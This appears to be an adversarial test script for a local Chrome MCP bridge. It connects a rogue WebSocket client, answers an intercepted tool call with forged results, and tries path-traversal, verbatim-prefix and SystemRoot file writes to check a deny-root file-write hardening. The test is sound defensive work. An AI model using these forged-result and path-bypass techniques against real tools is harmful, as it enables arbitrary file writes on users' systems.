// adv03-ws-channel-3.mjs — final pass against hardened writeOut (DENY_ROOTS).
// Forge results with file paths: temp dir (outside deny roots), repo dir
// (deny), SystemRoot (deny), Startup (deny), verbatim prefix (deny),
// traversal into repo (deny). Then final recovery check.
import WebSocket from 'ws';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const BASE = 'http://127.0.0.1:7890';
const MCP = BASE + '/mcp';
const WS_URL = 'ws://127.0.0.1:7890/ws';
const MARK = 'ADV03C-' + Math.random().toString(36).slice(2, 8);

const TMP_NEW = path.join(os.tmpdir(), 'adv03c-' + MARK + '.txt');          // outside deny roots, new file
const TMP_EXIST = path.join(os.tmpdir(), 'adv03c-exist.txt');               // outside deny roots, pre-existing
const REPO_NEW = 'D:\\Tool\\chrome-mcp\\bridge\\adv-tests\\ADV03C-NEW.txt'; // inside repo -> deny
const TRAVERSAL = 'D:\\Tool\\chrome-mcp\\bridge\\adv-tests\\..\\..\\TRAV.txt'; // resolves into repo -> deny
const SYSROOT = (process.env.SystemRoot || 'C:\\Windows') + '\\adv03c.txt'; // deny
const VERBATIM = '\\\\?\\' + TMP_NEW.replace(/\//g, '\\');                  // verbatim prefix -> deny

let pass = 0, fail = 0;
const findings = [];
const note = (sev, title, detail) => { findings.push({ sev, title }); console.log(`  [${sev}] ${title}\n      ${detail || ''}`); };
const ok = (m) => { pass++; console.log(`  PASS ${m}`); };
const bad = (m) => { fail++; console.log(`  FAIL ${m}`); };
const sleep = (ms) => new Promise(r => setTimeout(r, ms));
const status = async () => { try { return await (await fetch(BASE + '/')).json(); } catch { return null; } };

function wsConnect() {
  return new Promise((resolve) => {
    const ws = new WebSocket(WS_URL);
    ws.on('error', () => {});
    const t = setTimeout(() => resolve({ ws, opened: false }), 4000);
    ws.on('open', () => { clearTimeout(t); resolve({ ws, opened: true }); });
    ws.on('error', () => { clearTimeout(t); resolve({ ws, opened: false }); });
  });
}
async function rpc(body, sid, timeoutMs = 20000) {
  const ac = new AbortController(); const t = setTimeout(() => ac.abort(), timeoutMs);
  try {
    const res = await fetch(MCP, { method: 'POST', signal: ac.signal, headers: { 'content-type': 'application/json', accept: 'application/json, text/event-stream', ...(sid ? { 'mcp-session-id': sid } : {}) }, body: JSON.stringify(body) });
    const text = await res.text();
    const msgs = text.split('\n').filter(l => l.startsWith('data:')).map(l => { try { return JSON.parse(l.slice(5).trim()); } catch { return null; } }).filter(Boolean);
    return { msgs, sid: res.headers.get('mcp-session-id'), status: res.status, timeout: false };
  } catch (e) { return { msgs: [], sid: null, status: -1, timeout: true }; } finally { clearTimeout(t); }
}
async function initSession() {
  for (let i = 0; i < 5; i++) {
    const r = await rpc({ jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-03-26', capabilities: {}, clientInfo: { name: 'adv03c', version: '0' } } });
    if (r.sid) { await rpc({ jsonrpc: '2.0', method: 'notifications/initialized' }, r.sid); return r.sid; }
    await sleep(800); // session table may be full under contention
  }
  return null;
}

async function forgeOnce(sid, fileObj) {
  // connect rogue, trigger call, answer it with file-write result
  for (let att = 0; att < 10; att++) {
    const { ws, opened } = await wsConnect();
    if (!opened) { await sleep(500); continue; }
    const calls = [];
    ws.on('message', (raw) => { try { const m = JSON.parse(raw.toString()); if (m.type === 'call') calls.push(m); } catch {} });
    const callP = rpc({ jsonrpc: '2.0', id: 5000 + att, method: 'tools/call', params: { name: 'list_pages', arguments: {} } }, sid, 15000);
    const t0 = Date.now();
    while (Date.now() - t0 < 5000 && !calls.length && ws.readyState === 1) await sleep(20);
    if (calls.length) {
      ws.send(JSON.stringify({ type: 'result', id: calls[0].id, ok: true, data: { file: fileObj, echo: MARK } }));
      const r = await callP;
      const m = r.msgs.find(x => x.result);
      const text = m?.result?.content?.map(c => c.text || '').join('\n') || '';
      try { ws.close(); } catch {}
      return text;
    }
    try { ws.close(); } catch {}
    await callP.catch(() => {});
    await sleep(400);
  }
  return null;
}

console.log('===== adv03c hardened-writeOut forge test =====');
const s0 = await status();
console.log('  start:', JSON.stringify(s0));
fs.writeFileSync(TMP_EXIST, 'ORIGINAL');

const sid = await initSession();
if (!sid) { console.log('could not init MCP session'); process.exit(2); }

const cases = [
  ['temp NEW file (outside deny roots)', { path: TMP_NEW, content: 'planted-' + MARK }, TMP_NEW],
  ['temp EXISTING file overwrite', { path: TMP_EXIST, content: 'CLOBBERED-' + MARK }, TMP_EXIST],
  ['repo new file', { path: REPO_NEW, content: 'x' }, REPO_NEW],
  ['repo via traversal', { path: TRAVERSAL, content: 'x' }, 'D:\\Tool\\chrome-mcp\\TRAV.txt'],
  ['SystemRoot file', { path: SYSROOT, content: 'x' }, SYSROOT],
  ['verbatim \\\\?\\ prefix to temp', { path: VERBATIM, content: 'x' }, TMP_NEW],
];
for (const [name, fileObj, checkPath] of cases) {
  const text = await forgeOnce(sid, fileObj);
  if (text === null) { console.log(`  ${name}: could not land forge (slot contention)`); continue; }
  const wrote = fs.existsSync(checkPath) ? fs.readFileSync(checkPath, 'utf8') : null;
  const line = text.split('\n').find(l => /saved:|failed/.test(l)) || text.slice(0, 140);
  console.log(`  ${name}:\n    reply: ${line.slice(0, 160)}\n    disk: ${wrote === null ? '<absent>' : JSON.stringify(wrote.slice(0, 60))}`);
}
// evaluate
const tNew = fs.existsSync(TMP_NEW) ? fs.readFileSync(TMP_NEW, 'utf8') : null;
const tEx = fs.existsSync(TMP_EXIST) ? fs.readFileSync(TMP_EXIST, 'utf8') : null;
if (tNew && tNew.includes('planted')) note('HIGH', 'forged result still writes NEW files outside deny roots', TMP_NEW + ' created — DENY_ROOTS covers only repo/SystemRoot/Startup; rest of FS writable');
if (tEx === 'CLOBBERED-' + MARK) note('HIGH', 'forged result still OVERWRITES existing files outside deny roots', TMP_EXIST + ' clobbered');
if (fs.existsSync(REPO_NEW) || fs.existsSync('D:\\Tool\\chrome-mcp\\TRAV.txt')) note('CRIT', 'repo write bypass succeeded', '');
else ok('repo writes denied (direct + traversal)');
if (fs.existsSync(SYSROOT)) note('CRIT', 'SystemRoot write succeeded', '');
else ok('SystemRoot write denied');

// cleanup my artifacts
for (const f of [TMP_NEW, TMP_EXIST, REPO_NEW, 'D:\\Tool\\chrome-mcp\\TRAV.txt']) { try { fs.unlinkSync(f); } catch {} }

// final recovery
const t0 = Date.now();
let extOk = false;
while (Date.now() - t0 < 30000) { const s = await status(); if (s && s.extensionConnected) { extOk = true; break; } await sleep(400); }
console.log('  final ext:', extOk ? 'CONNECTED (' + (Date.now() - t0) + 'ms)' : 'NOT CONNECTED', JSON.stringify(await status()));
if (extOk) ok('final extensionConnected=true'); else bad('extension absent at end');
console.log(`\n===== ${findings.length} findings =====`);
findings.forEach((f, i) => console.log(`  ${i + 1}. [${f.sev}] ${f.title}`));
console.log(`DONE (${pass} pass, ${fail} fail)`);
setTimeout(() => process.exit(0), 300).unref();
